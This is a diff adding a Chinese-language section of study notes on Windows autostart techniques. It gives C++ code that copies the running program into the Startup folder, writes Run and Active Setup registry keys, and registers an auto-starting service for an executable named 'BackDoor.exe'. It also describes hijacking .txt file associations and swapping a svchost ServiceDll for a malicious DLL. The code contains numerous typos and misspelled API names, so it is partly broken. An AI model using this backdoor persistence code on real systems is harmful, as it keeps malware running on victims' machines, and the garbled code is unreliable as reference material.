@@ -382,3 +382,124 @@ int main(){
 };
 ```
 
+## 自启动技术
+
+### 法一
+
+启动目录。
+
+```c++
+GetSystemDirectory(szSysPath,MAX_PATH);
+strncpy(szStartDirectory,szSysPath,3);
+strcat(szStartDirectory,"Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\test.exe");
+GetModuleFileName(NULL,szFileName,MAX_PATH);
+CopyFile(szFileName,szStartDirectory,FALSE);
+```
+
+### 法二
+
+注册表启动。几个常用位置：
+
+```
+Run注册表键
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+Boot Execute
+HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute
+HKLM\System\CurrentControlSet\Control\Session Manager\SetupExecute
+HKLM\System\CurrentControlSet\Control\Session Manager\Execute
+HKLM\System\CurrentControlSet\Control\Session Manager\S0InitialCommand
+Load注册表键
+HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
+```
+
+示例程序：
+
+```c++
+GetModuleFileName(NULL,szFileName,MAX_PATH);
+HKEY hKey=NULL;
+RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
+RegSetValueEx(hKey,"test",0,REG_SZ,(const unsigned char*)szFileName,strlen(szFileName)+sizeof(char));
+RegCloseKey(hKey);
+```
+
+### ActivieX启动
+
+```c++
+#include <windows.h>
+#define REG_PATH "software\\microsoft\\active setup\\Installed Components\\{E0EDB497-B2F5-4B4F-97EC-2362BC4CC50D}";//一个已存在的GUID
+int main(){
+    HKEY hKey;
+    LONG lRet=RegOpenKeyEx(HKEY_CURRENT_USER,REG_PATH,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,&hKey);
+    if(lRet!=ERROR_SUCCESS){
+        char szSelfFile[MAX_PATH]={0};
+        char szSystemPath[MAX_PATH]={0};
+        GetSystemDirecotry(szSystemPath,MAX_PATH);
+        strcat(szSystemPath,"\\Backdoor.exe");
+        GetModuleFileName(NULL,szSystemPath,FALSE);
+        lRet=RegCreateKeyEx(HKEY_LOCAL_MACHINE,REG_PATH,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
+        if(lRet!=ERROR_SUCCESS)
+            return -1;
+        lRet=RegSetValueEx(hKey,"stubpath",0,REG_SZ,(CONST BYTE*)szSystemPath,strlen(szSystemPath));
+        if(lRet!=ERROR_SUCCESS){
+            REgCloseKey(hKey);
+            return -1;
+        };
+    };
+    RegCloseKey(hKey);
+    RegDeleteKey(HKEY_CURRENT_USER,REG_PATH);//第一次启动成功后系统在HKCU下建立GUID值，再次启动时不会被启动，所以要删除
+    return 0;
+};
+```
+
+### 服务启动
+
+```c++
+#include <Windows.h>
+#include <stdio.h>
+int main(int argc,char* argv[]){
+    char szFileName[MAX_PATH]={0};
+    GetModuleFileName(NULL,szFileName,MAX_PATH);
+    SC_HANDLE scHandle=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
+    SC_HANDLE scHandleOpen=OpenService(scHandle,"door",SERVICE_ALL_ACCESS);
+    if(scHandleOpen==NULL){
+        char szSelfFile[MAX_PATH]={0};
+        char szSystemPath[MAX_PATH]={0};
+        GetSystemDirectory(szSystemPath,MAX_PATH);
+        strcat(szSystempath,"\\BackDoor.exe");
+        GetModuleFileName(NULL,szSelfFile,MAX_PATH);
+        CopyFile(szSelfFile,szSystemPath,FALSE);
+        SC_HANDLE scNewHandle=CreateService(scHandle,"door","door",SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,szSystemPath,NULL,sULL,NULL,NULL,NULL);
+        StartService(scNewhandle,0,NULL);
+        CloseServiceHandle(scNewHandle);
+        MessageBox(NULL,"service run","door",MB_OK);
+    };
+    CloseServiceHandle(scHandleOpen);
+    CloseServiceHandle(scHandle);
+    //以下可以自由发挥，例如：记录时间
+    FILE *pFile=fopen("c:\\a.txt","wa");
+    SYSTEMTIME st;
+    GetSystemTime(&st);
+    char szTime[MAXBYTE]={0};
+    wsprintf(szTime,"%d:%d:%d",st.wHour,st.wMinute,st.wSecond);
+    fputs(szTime,pFile);
+    fclose(pFile);
+    return 0;
+};
+```
+
+### 文件关联启动
+
+在注册表HEKY_CLASS_ROOT\txtfile\shell\open\command下记录打开.txt所需的notepad程序，可以进行替换。
+
+### 替换系统服务启动
+
+举例说明：RemoteAccess服务的宿主为svchost.exe。观察注册表HEKY_LOCAL_MACHINE\System\CurrentControlSet\Services\RemoteAccess\Parameters中键ServiceDll的值为%SystemRoot%\Sytsem32\mprdim.dll。HEKY_LOCAL_MACHINE\System\CurrentControlSet\Services\RemoteAccess中键ImagePath给出了scvhost的启动方式：
+
+```bash
+%SystemRoot%\system32\scvhost.exe -k netsvcs
+```
+
+具体该启动方法可以查看注册表：HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Svchost\中键netsvcs，内容有Remoteaccess。
+
+可以将某服务中ServiceDll替换为恶意DLL路径，即可被svchost启动。
